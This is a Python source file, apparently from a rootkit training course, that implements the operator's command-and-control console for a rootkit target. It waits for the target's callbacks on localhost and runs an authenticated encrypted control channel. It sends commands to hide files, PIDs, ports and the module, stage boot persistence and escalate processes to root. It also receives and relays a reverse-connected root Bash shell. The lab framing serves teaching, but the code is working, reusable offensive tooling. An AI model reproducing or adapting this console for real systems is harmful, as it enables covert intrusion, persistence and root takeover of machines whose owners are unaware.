"""Authenticated control console and two-terminal target session state."""

from __future__ import annotations

from dataclasses import dataclass
import fcntl
import os
from pathlib import Path
import re
import secrets
import selectors
import socket
import stat
import struct
import subprocess
import sys
import termios
import time
import tomllib
import tty
from typing import Callable, TextIO


KEY_LENGTH = 32
NONCE_LENGTH = 12
TAG_LENGTH = 16
HEADER_LENGTH = 18
FRAME_MAX = 128
VERSION = 1
REQUEST = 1
REPLY = 2
SEQUENCE_MAX = 0x7FFFFFFF
GUEST_SHELL_PORT = 47024
SHELL_PRELUDE_LENGTH = 31
SHELL_TICKET = re.compile(r"OPEN ([0-9a-f]{8}) ([0-9a-f]{16})")
SHELL_STATUS = re.compile(
    r"STATE ([0-9a-f]{8}) "
    r"(idle|connecting|running|exited|refused|timed-out|failed|stopped) "
    r"(-?[0-9]+)"
)
COMMAND_HELP = """Hide
  hide file PREFIX      hide files with this prefix from directory listings
  hide pid PID          hide this PID from /proc
  hide content STRING   hide lines containing this string from file reads
  hide port PORT        hide this port from /proc/net/tcp
  unhide CATEGORY N     unhide target at index N
  unhide all            clear all hidden targets

Operate
  persist               stage a boot-load request
  hide module           hide module from lsmod
  unhide module         restore module visibility
  escalate PID          escalate process to root
  shell                 open interactive root Bash
  shell status          show the latest shell result
  status                show current state and hidden targets

Session
  ping                  test the control channel
  info                  identify the agent
  help                  show these commands
  quit                  disconnect
"""
CONTROL_TEXT_MAX = FRAME_MAX - HEADER_LENGTH - TAG_LENGTH
SESSION_FILES = frozenset((
    "control.key", "operator.ready", "session.toml",
))
SESSION_FIELDS = frozenset((
    "schema_version", "exercise", "target_pid", "target_start",
    "control_port", "shell_port",
))


class OperatorError(RuntimeError):
    """The target session or its authenticated operator failed."""


def _nonce(session: int, sequence: int, kind: int) -> bytes:
    if not 0 < session < 1 << 64:
        raise OperatorError("session must be a nonzero 64-bit integer")
    if not 0 < sequence <= SEQUENCE_MAX or kind not in (REQUEST, REPLY):
        raise OperatorError("invalid secure-envelope sequence or direction")
    counter = (sequence << 1) | (kind == REPLY)
    return struct.pack(">QI", session, counter)


class OpenSslAead:
    """AES-256-GCM adapter backed by the course's OpenSSL helper."""

    def __init__(
        self,
        key: bytes,
        helper: Path,
        output: Callable[[str], None],
    ):
        if len(key) != KEY_LENGTH:
            raise OperatorError("control key must contain exactly 32 bytes")
        self._key = key
        self._helper = helper
        self._output = output

    def close(self) -> None:
        self._key = bytes(KEY_LENGTH)

    def _run(
        self,
        operation: str,
        nonce: bytes,
        aad: bytes,
        payload: bytes,
    ) -> bytes:
        if len(nonce) != NONCE_LENGTH:
            raise OperatorError("AES-GCM nonce must contain exactly 12 bytes")
        if len(aad) > 0xFFFF or len(payload) > 0xFFFF:
            raise OperatorError("AES-GCM input exceeds the helper limit")
        request = b"".join((
            self._key,
            nonce,
            struct.pack(">HH", len(aad), len(payload)),
            aad,
            payload,
        ))
        command = [self._helper, operation]
        result = subprocess.run(
            command,
            input=request,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            check=False,
        )
        if result.stderr:
            self._output(result.stderr.decode(errors="replace"))
        if result.returncode:
            detail = result.stderr.decode(errors="replace").strip()
            raise OperatorError(detail or "OpenSSL AES-GCM operation failed")
        return result.stdout

    def seal(self, nonce: bytes, aad: bytes, plaintext: bytes) -> bytes:
        sealed = self._run("seal", nonce, aad, plaintext)
        if len(sealed) != len(plaintext) + TAG_LENGTH:
            raise OperatorError("OpenSSL AES-GCM returned a truncated result")
        return sealed

    def open(self, nonce: bytes, aad: bytes, sealed: bytes) -> bytes:
        if len(sealed) < TAG_LENGTH:
            raise OperatorError("authenticated payload is shorter than its tag")
        plaintext = self._run("open", nonce, aad, sealed)
        if len(plaintext) != len(sealed) - TAG_LENGTH:
            raise OperatorError("OpenSSL AES-GCM returned a truncated result")
        return plaintext


class SecureControl:
    """One authenticated control connection negotiated by a HELLO frame."""

    def __init__(self, key: bytes, aead_factory):
        self._aead = aead_factory(key)
        self.session = 0
        self.next_request = 1
        self.next_reply = 1

    def close(self) -> None:
        self._aead.close()

    @staticmethod
    def _header(kind: int, session: int, sequence: int) -> bytes:
        return struct.pack(">BBQQ", VERSION, kind, session, sequence)

    @staticmethod
    def _parts(
        envelope: bytes,
    ) -> tuple[bytes, int, int, int, int, bytes]:
        if not HEADER_LENGTH + TAG_LENGTH <= len(envelope) <= FRAME_MAX:
            raise OperatorError("secure envelope has an invalid length")
        header = envelope[:HEADER_LENGTH]
        version, kind, session, sequence = struct.unpack(">BBQQ", header)
        return (
            header,
            version,
            kind,
            session,
            sequence,
            envelope[HEADER_LENGTH:],
        )

    def accept_hello(self, envelope: bytes) -> int:
        header, version, kind, session, sequence, sealed = self._parts(envelope)
        if version != VERSION or kind != REPLY or sequence != 1 or not session:
            raise OperatorError("invalid HELLO envelope header")
        plaintext = self._aead.open(
            _nonce(session, sequence, kind),
            header,
            sealed,
        )
        if plaintext != b"HELLO":
            raise OperatorError("authenticated first message is not HELLO")
        self.session = session
        self.next_reply = 2
        return session

    def seal_request(self, plaintext: bytes) -> bytes:
        if not self.session:
            raise OperatorError("HELLO has not been authenticated")
        if len(plaintext) > FRAME_MAX - HEADER_LENGTH - TAG_LENGTH:
            raise OperatorError("control command is too long")
        if self.next_request > SEQUENCE_MAX:
            raise OperatorError("control request sequence is exhausted")
        sequence = self.next_request
        header = self._header(REQUEST, self.session, sequence)
        sealed = self._aead.seal(
            _nonce(self.session, sequence, REQUEST),
            header,
            plaintext,
        )
        self.next_request += 1
        return header + sealed

    def open_reply(self, envelope: bytes) -> bytes:
        if not self.session:
            raise OperatorError("HELLO has not been authenticated")
        if self.next_reply > SEQUENCE_MAX:
            raise OperatorError("control reply sequence is exhausted")
        header, version, kind, session, sequence, sealed = self._parts(envelope)
        if (
            version != VERSION
            or kind != REPLY
            or session != self.session
            or sequence != self.next_reply
        ):
            raise OperatorError("unexpected authenticated reply header")
        plaintext = self._aead.open(
            _nonce(session, sequence, kind),
            header,
            sealed,
        )
        self.next_reply += 1
        return plaintext


def _receive_exact(peer: socket.socket, length: int) -> bytes:
    chunks = bytearray()
    while len(chunks) < length:
        chunk = peer.recv(length - len(chunks))
        if not chunk:
            raise OperatorError("control connection closed mid-frame")
        chunks.extend(chunk)
    return bytes(chunks)


def receive_frame(peer: socket.socket) -> bytes:
    length = struct.unpack(">H", _receive_exact(peer, 2))[0]
    if not 1 <= length <= FRAME_MAX:
        raise OperatorError("control frame has an invalid length")
    return _receive_exact(peer, length)


def send_frame(peer: socket.socket, payload: bytes) -> None:
    if not 1 <= len(payload) <= FRAME_MAX:
        raise OperatorError("control frame has an invalid length")
    peer.sendall(struct.pack(">H", len(payload)) + payload)


def _listener(port: int = 0) -> socket.socket:
    listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        listener.bind(("127.0.0.1", port))
        listener.listen(4)
    except OSError:
        listener.close()
        raise
    return listener


def _new_key() -> bytes:
    key = bytes(KEY_LENGTH)
    while not any(key):
        key = secrets.token_bytes(KEY_LENGTH)
    return key


def _available_port(exclude: int = 0) -> int:
    while True:
        listener = _listener()
        port = int(listener.getsockname()[1])
        listener.close()
        if port != exclude:
            return port


def _process_start(pid: int) -> int | None:
    if pid <= 0:
        return None
    try:
        fields = Path(f"/proc/{pid}/stat").read_text(encoding="ascii")
        return int(fields.rsplit(")", 1)[1].split()[19])
    except (OSError, UnicodeError, ValueError, IndexError):
        return None


@dataclass(frozen=True)
class TargetSession:
    """Private connection state shared by the target and operator CLIs."""

    directory: Path
    exercise: str
    target_pid: int
    target_start: int
    control_port: int
    shell_port: int
    key: bytes

    @property
    def key_file(self) -> Path:
        return self.directory / "control.key"

    @property
    def ready_file(self) -> Path:
        return self.directory / "operator.ready"

    def close(self) -> None:
        for name in SESSION_FILES:
            path = self.directory / name
            if path.exists() and not path.is_symlink() and path.is_file():
                path.unlink()
        try:
            self.directory.rmdir()
        except FileNotFoundError:
            pass
        except OSError as error:
            raise OperatorError(
                f"could not clean target session: {self.directory}"
            ) from error


def _remove_stale_session(directory: Path) -> None:
    if not directory.exists():
        return
    if directory.is_symlink() or not directory.is_dir():
        raise OperatorError(f"unsafe target session path: {directory}")
    names = {path.name for path in directory.iterdir()}
    if not names <= SESSION_FILES:
        raise OperatorError(
            f"target session contains unknown files: {directory}"
        )
    for name in names:
        path = directory / name
        if path.is_symlink() or not path.is_file():
            raise OperatorError(f"unsafe target session file: {path}")
        path.unlink()
    directory.rmdir()


def _write_private(path: Path, content: str) -> None:
    flags = os.O_WRONLY | os.O_CREAT | os.O_EXCL
    flags |= getattr(os, "O_NOFOLLOW", 0)
    descriptor = os.open(path, flags, 0o600)
    with os.fdopen(descriptor, "w", encoding="ascii") as output:
        output.write(content)


def create_target_session(
    root: Path,
    exercise: str,
) -> TargetSession:
    """Create one private run directory for a foreground target."""
    run_root = root / ".rootkitlings/run"
    if run_root.is_symlink():
        raise OperatorError(f"unsafe target session root: {run_root}")
    run_root.mkdir(parents=True, exist_ok=True, mode=0o700)
    if run_root.stat().st_uid != os.getuid():
        raise OperatorError(
            f"target session root has the wrong owner: {run_root}"
        )
    run_root.chmod(0o700)
    directory = run_root / exercise
    if directory.exists():
        try:
            previous = read_target_session(root, exercise)
        except OperatorError:
            previous = None
        if previous is not None:
            raise OperatorError(f"target {exercise} is already running")
        _remove_stale_session(directory)
    directory.mkdir(mode=0o700)
    key = _new_key()
    control_port = _available_port()
    shell_port = _available_port(control_port)
    target_pid = os.getpid()
    target_start = _process_start(target_pid)
    if target_start is None:
        raise OperatorError("could not identify the target process")
    session = TargetSession(
        directory,
        exercise,
        target_pid,
        target_start,
        control_port,
        shell_port,
        key,
    )
    try:
        _write_private(session.key_file, key.hex() + "\n")
        metadata = (
            "schema_version = 1\n"
            f'exercise = "{exercise}"\n'
            f"target_pid = {session.target_pid}\n"
            f"target_start = {session.target_start}\n"
            f"control_port = {control_port}\n"
            f"shell_port = {shell_port}\n"
        )
        _write_private(directory / "session.toml", metadata)
    except BaseException:
        session.close()
        raise
    return session


def _read_private(path: Path) -> str:
    flags = os.O_RDONLY | getattr(os, "O_NOFOLLOW", 0)
    try:
        descriptor = os.open(path, flags)
    except OSError as error:
        raise OperatorError(f"target session is incomplete: {path}") from error
    try:
        details = os.fstat(descriptor)
        if (
            not stat.S_ISREG(details.st_mode)
            or stat.S_IMODE(details.st_mode) != 0o600
            or details.st_uid != os.getuid()
        ):
            raise OperatorError(f"target session file is not private: {path}")
        with os.fdopen(descriptor, encoding="ascii") as source:
            descriptor = -1
            return source.read()
    except UnicodeError as error:
        raise OperatorError(
            f"target session file is not ASCII: {path}"
        ) from error
    finally:
        if descriptor >= 0:
            os.close(descriptor)


def read_target_session(
    root: Path,
    exercise: str,
) -> TargetSession:
    """Load and validate the private state for a running target."""
    directory = root / ".rootkitlings/run" / exercise
    if directory.is_symlink() or not directory.is_dir():
        raise OperatorError(
            f"target {exercise} is not running; start it in another terminal"
        )
    details = directory.stat()
    if stat.S_IMODE(details.st_mode) != 0o700 or details.st_uid != os.getuid():
        raise OperatorError(
            f"target session directory is not private: {directory}"
        )
    metadata_path = directory / "session.toml"
    key_path = directory / "control.key"
    try:
        metadata = tomllib.loads(_read_private(metadata_path))
        key_text = _read_private(key_path)
    except tomllib.TOMLDecodeError as error:
        raise OperatorError("target session state is invalid") from error
    if set(metadata) != SESSION_FIELDS:
        raise OperatorError("target session fields are invalid")
    if (
        metadata["schema_version"] != 1
        or metadata["exercise"] != exercise
    ):
        raise OperatorError("target session does not match this exercise")
    numbers = (
        metadata["target_pid"],
        metadata["target_start"],
        metadata["control_port"],
        metadata["shell_port"],
    )
    if any(isinstance(value, bool) or not isinstance(value, int)
           for value in numbers):
        raise OperatorError("target session contains an invalid number")
    target_pid, target_start, control_port, shell_port = numbers
    if (
        _process_start(target_pid) != target_start
        or not 1 <= control_port <= 65535
        or not 1 <= shell_port <= 65535
        or control_port == shell_port
    ):
        raise OperatorError("target session is no longer active")
    if not re.fullmatch(r"[0-9a-f]{64}\n", key_text):
        raise OperatorError("target session key is invalid")
    key = bytes.fromhex(key_text.strip())
    if not any(key):
        raise OperatorError("target session key is invalid")
    return TargetSession(
        directory,
        exercise,
        target_pid,
        target_start,
        control_port,
        shell_port,
        key,
    )


def wait_for_operator(target: TargetSession) -> None:
    """Wait until the second terminal has bound both callback listeners."""
    while True:
        try:
            details = target.ready_file.lstat()
        except FileNotFoundError:
            time.sleep(0.1)
            continue
        if (
            not stat.S_ISREG(details.st_mode)
            or stat.S_IMODE(details.st_mode) != 0o600
            or details.st_uid != os.getuid()
        ):
            raise OperatorError(
                f"unsafe operator readiness file: {target.ready_file}"
            )
        return


def _mark_operator_ready(target: TargetSession) -> None:
    if target.ready_file.exists() or target.ready_file.is_symlink():
        details = target.ready_file.lstat()
        if not stat.S_ISREG(details.st_mode) or details.st_uid != os.getuid():
            raise OperatorError(
                f"unsafe operator readiness file: {target.ready_file}"
            )
        target.ready_file.unlink()
    _write_private(target.ready_file, "ready\n")


@dataclass
class HostOperator:
    key: bytes
    control_listener: socket.socket
    shell_listener: socket.socket

    @classmethod
    def create(cls) -> "HostOperator":
        return cls(_new_key(), _listener(), _listener())

    @classmethod
    def from_session(cls, session: TargetSession) -> "HostOperator":
        try:
            control = _listener(session.control_port)
            try:
                shell = _listener(session.shell_port)
            except BaseException:
                control.close()
                raise
        except OSError as error:
            raise OperatorError(
                "another operator is already connected to this target"
            ) from error
        return cls(session.key, control, shell)

    @property
    def control_port(self) -> int:
        return int(self.control_listener.getsockname()[1])

    @property
    def shell_port(self) -> int:
        return int(self.shell_listener.getsockname()[1])

    def close(self) -> None:
        self.control_listener.close()
        self.shell_listener.close()


class TargetProcess:
    """Popen-like liveness view backed by PID plus Linux start time."""

    def __init__(self, session: TargetSession):
        self._session = session
        self.returncode = None

    def poll(self):
        start = _process_start(self._session.target_pid)
        if start == self._session.target_start:
            return None
        self.returncode = "stopped"
        return self.returncode


def _build_crypto_helper(
    root: Path,
    directory: Path,
    transcript: Callable[[list[object]], None],
    output: Callable[[str], None],
) -> Path:
    directory.mkdir(parents=True, exist_ok=True)
    helper = directory / "control-aead"
    source = root / "engine/control_aead.c"
    lock_path = directory / "control-aead.lock"
    with lock_path.open("a+b") as lock:
        fcntl.flock(lock, fcntl.LOCK_EX)
        if (
            helper.is_file()
            and not helper.is_symlink()
            and helper.stat().st_mtime_ns >= source.stat().st_mtime_ns
        ):
            return helper
        candidate = directory / ".control-aead.new"
        command = [
            "gcc", "-std=c11", "-Wall", "-Wextra", "-Werror", "-O2",
            "-o", str(candidate), str(source), "-lcrypto",
        ]
        transcript(command)
        result = subprocess.run(
            command,
            cwd=root,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            check=False,
        )
        if result.stdout:
            output(result.stdout)
        if result.returncode:
            candidate.unlink(missing_ok=True)
            raise OperatorError(
                "could not build control crypto; run make doctor"
            )
        os.replace(candidate, helper)
    return helper


def _accept_while_running(
    listener: socket.socket,
    process,
    timeout: float,
) -> socket.socket:
    deadline = time.monotonic() + timeout
    listener.settimeout(0.25)
    while time.monotonic() < deadline:
        if process.poll() is not None:
            status = process.returncode
            raise OperatorError(
                f"target stopped before connecting ({status})"
            )
        try:
            peer, _ = listener.accept()
            return peer
        except TimeoutError:
            continue
    raise OperatorError("timed out waiting for the target callback")


def parse_shell_ticket(reply: str) -> tuple[int, int]:
    match = SHELL_TICKET.fullmatch(reply)
    if match is None:
        raise OperatorError("shell request returned an invalid ticket")
    request_id = int(match.group(1), 16)
    cookie = int(match.group(2), 16)
    if not request_id or not cookie:
        raise OperatorError("shell request returned an invalid ticket")
    return request_id, cookie


def _encode_control_command(command: str) -> bytes:
    try:
        payload = command.encode("ascii")
    except UnicodeEncodeError as error:
        raise OperatorError("commands use ASCII characters only") from error
    if len(payload) > CONTROL_TEXT_MAX:
        raise OperatorError(
            f"command is too long (maximum {CONTROL_TEXT_MAX} ASCII bytes)"
        )
    return payload


def _parse_operator_command(line: str) -> str | None:
    parts = line.strip().split(None, 2)
    if not parts:
        return None
    verb = parts[0].lower()
    if verb == "hide" and len(parts) == 3:
        category = parts[1].lower()
        value = parts[2]
        if category in ("file", "pid", "content", "port"):
            return f"HIDE {category.upper()} {value}"
    elif verb == "unhide":
        if len(parts) == 2 and parts[1].lower() == "all":
            return "UNHIDE ALL"
        if len(parts) == 3:
            category = parts[1].lower()
            index = parts[2]
            if category in ("file", "pid", "content", "port") and index.isdigit():
                return f"UNHIDE {category.upper()} {index}"
    elif verb == "list" and len(parts) == 2:
        category = parts[1].lower()
        if category in ("file", "pid", "content", "port"):
            return f"LIST {category.upper()}"
    elif verb == "status":
        return "STATUS"
    elif verb == "persist":
        return "PERSIST"
    elif verb == "hide" and len(parts) == 2 and parts[1].lower() == "module":
        return "HIDE MODULE"
    elif verb == "unhide" and len(parts) == 2 and parts[1].lower() == "module":
        return "UNHIDE MODULE"
    elif verb == "escalate" and len(parts) == 2 and parts[1].isdigit():
        return f"ESCALATE {parts[1]}"
    elif verb == "shell":
        if len(parts) > 1 and parts[1].lower() == "status":
            return "SHELL STATUS"
        return f"SHELL {GUEST_SHELL_PORT}"
    elif verb == "ping":
        return "PING"
    elif verb == "info":
        return "INFO"
    elif verb == "quit":
        return "QUIT"
    return None


def _next_control_command(
    input_stream: TextIO,
    output: Callable[[str], None],
    warning: Callable[[str], None],
) -> tuple[str, bytes] | None:
    while True:
        output("operator> ")
        line = input_stream.readline()
        if not line:
            return None
        command = line.strip()
        if not command:
            continue
        if command.lower() in ("help", "?"):
            output(COMMAND_HELP)
            continue
        wire = _parse_operator_command(command)
        if wire is None:
            warning(f"unknown command: {command}; type help")
            continue
        try:
            payload = _encode_control_command(wire)
        except OperatorError as error:
            warning(str(error))
            continue
        return wire, payload


def _poll_shell_status(
    request_id: int,
    exchange: Callable[[str], str],
    pause: Callable[[float], None] = time.sleep,
) -> str:
    for _ in range(100):
        reply = exchange("SHELL STATUS")
        match = SHELL_STATUS.fullmatch(reply)
        if match is None or int(match.group(1), 16) != request_id:
            raise OperatorError("shell returned an invalid status")
        if match.group(2) not in ("connecting", "running"):
            return reply
        pause(0.05)
    raise OperatorError("shell did not reach a terminal state")


def _accept_shell_while_running(
    listener: socket.socket,
    process,
    request_id: int,
    cookie: int,
    timeout: float,
    warning: Callable[[str], None],
) -> socket.socket:
    expected = f"RKSH {request_id:08x} {cookie:016x}\n".encode("ascii")
    deadline = time.monotonic() + timeout
    while time.monotonic() < deadline:
        shell = None
        remaining = deadline - time.monotonic()
        try:
            shell = _accept_while_running(
                listener,
                process,
                remaining,
            )
        except OperatorError:
            raise
        try:
            shell.settimeout(min(2.0, remaining))
            prelude = _receive_exact(shell, SHELL_PRELUDE_LENGTH)
        except (OSError, OperatorError):
            if shell is not None:
                shell.close()
            continue
        if secrets.compare_digest(prelude, expected):
            shell.settimeout(None)
            return shell
        warning("Rejected a shell connection with the wrong ticket")
        shell.close()
    raise OperatorError("timed out waiting for the requested root shell")


def run_control_console(
    root: Path,
    target: TargetSession,
    *,
    transcript: Callable[[list[object]], None],
    output: Callable[[str], None],
    success: Callable[[str], None],
    warning: Callable[[str], None],
    input_stream: TextIO | None = None,
) -> int:
    """Operate one running target over its real authenticated callbacks."""
    input_stream = input_stream or sys.stdin
    operator = HostOperator.from_session(target)
    process = TargetProcess(target)
    peer = None
    secure = None
    try:
        output(
            f"listen  control  127.0.0.1:{operator.control_port}\n"
            f"listen  shell    127.0.0.1:{operator.shell_port}\n"
            "wait    control  target callback\n"
        )
        helper = _build_crypto_helper(
            root,
            root / ".rootkitlings/tools",
            transcript,
            output,
        )
        _mark_operator_ready(target)
        output("ready   target   callback listeners bound\n")
        peer = _accept_while_running(
            operator.control_listener,
            process,
            90,
        )
        peer.settimeout(30)
        output("accept  control  target callback\n")
        secure = SecureControl(
            operator.key,
            lambda key: OpenSslAead(key, helper, output),
        )
        session = secure.accept_hello(receive_frame(peer))
        success(f"verify  HELLO    session={session:016x}")
        output("Type help to list the fixed protocol commands.\n")

        def exchange(command: str) -> str:
            output(f"send    {command}\n")
            payload = _encode_control_command(command)
            send_frame(peer, secure.seal_request(payload))
            reply = secure.open_reply(receive_frame(peer)).decode(
                "ascii",
                errors="replace",
            )
            output(f"recv    {reply}\n")
            return reply

        while True:
            selected = _next_control_command(
                input_stream,
                output,
                warning,
            )
            if selected is None:
                break
            command_text, payload = selected
            output(f"send    {command_text}\n")
            send_frame(peer, secure.seal_request(payload))
            if command_text == "QUIT":
                break
            reply = secure.open_reply(receive_frame(peer)).decode(
                "ascii", errors="replace"
            )
            output(f"recv    {reply}\n")
            if reply.startswith("OPEN "):
                request_id, cookie = parse_shell_ticket(reply)
                output("wait    shell    target callback\n")
                shell = _accept_shell_while_running(
                    operator.shell_listener,
                    process,
                    request_id,
                    cookie,
                    30,
                    warning,
                )
                output(
                    "recv    RKSH "
                    f"{request_id:08x} {cookie:016x}\n"
                )
                success("verify  ticket   matched")
                output("Remote root Bash. Type exit to return.\n")
                with shell:
                    _relay_shell(shell, input_stream, output)
                output("\nRemote Bash closed.\n")
                _poll_shell_status(request_id, exchange)
        return 0
    except KeyboardInterrupt as error:
        raise OperatorError("control console interrupted") from error
    except (OSError, OperatorError, UnicodeError) as error:
        raise OperatorError(str(error)) from error
    finally:
        if secure is not None:
            secure.close()
        if peer is not None:
            peer.close()
        operator.close()
        if (
            target.ready_file.exists()
            and not target.ready_file.is_symlink()
            and target.ready_file.is_file()
        ):
            target.ready_file.unlink()


def _relay_shell(
    shell: socket.socket,
    input_stream: TextIO,
    output: Callable[[str], None],
) -> None:
    """Relay a remote PTY, using local raw mode when stdin is a terminal."""
    selector = selectors.DefaultSelector()
    selector.register(shell, selectors.EVENT_READ, "shell")
    input_fd = None
    close_pending = False
    input_line = bytearray()
    saved_terminal = None
    try:
        input_fd = input_stream.fileno()
        if os.isatty(input_fd):
            saved_terminal = termios.tcgetattr(input_fd)
            tty.setraw(input_fd)
        selector.register(input_fd, selectors.EVENT_READ, "input")
    except (AttributeError, ValueError, OSError, termios.error):
        input_fd = None
        try:
            selector.register(input_stream, selectors.EVENT_READ, "input")
        except (ValueError, OSError):
            shell.shutdown(socket.SHUT_WR)
    try:
        while selector.get_map():
            for key, _ in selector.select():
                if key.data == "shell":
                    data = shell.recv(4096)
                    if not data:
                        selector.unregister(shell)
                        return
                    output(data.decode(errors="replace"))
                    if close_pending:
                        shell.shutdown(socket.SHUT_WR)
                        close_pending = False
                elif input_fd is not None:
                    data = os.read(input_fd, 4096)
                    if not data:
                        selector.unregister(input_fd)
                        shell.shutdown(socket.SHUT_WR)
                    else:
                        forwarded, close_input = _shell_input(data, input_line)
                        if forwarded:
                            shell.sendall(forwarded)
                        if close_input:
                            selector.unregister(input_fd)
                            if forwarded:
                                close_pending = True
                            else:
                                shell.shutdown(socket.SHUT_WR)
                else:
                    line = input_stream.readline()
                    if not line:
                        selector.unregister(input_stream)
                        shell.shutdown(socket.SHUT_WR)
                    else:
                        data = line.encode()
                        forwarded, close_input = _shell_input(
                            data,
                            input_line,
                        )
                        if forwarded:
                            shell.sendall(forwarded)
                        if close_input:
                            selector.unregister(input_stream)
                            if forwarded:
                                close_pending = True
                            else:
                                shell.shutdown(socket.SHUT_WR)
    finally:
        if saved_terminal is not None and input_fd is not None:
            termios.tcsetattr(input_fd, termios.TCSADRAIN, saved_terminal)
        selector.close()


def _shell_input(data: bytes, line: bytearray) -> tuple[bytes, bool]:
    """Forward terminal bytes and recognize an explicit local shell exit."""
    forwarded = bytearray()
    close_input = False
    for byte in data:
        if byte == 4:
            # The remote process owns a PTY.  Forward VEOF so its line
            # discipline, not the TCP stream, gives Bash terminal EOF.
            forwarded.append(byte)
            close_input = not line
            line.clear()
            continue
        forwarded.append(byte)
        if byte in (10, 13):
            command = bytes(line).strip()
            if command in (b"exit", b"logout") or command.startswith(b"exit "):
                close_input = True
            line.clear()
        elif len(line) < 256:
            line.append(byte)
        else:
            line.clear()
    return bytes(forwarded), close_input
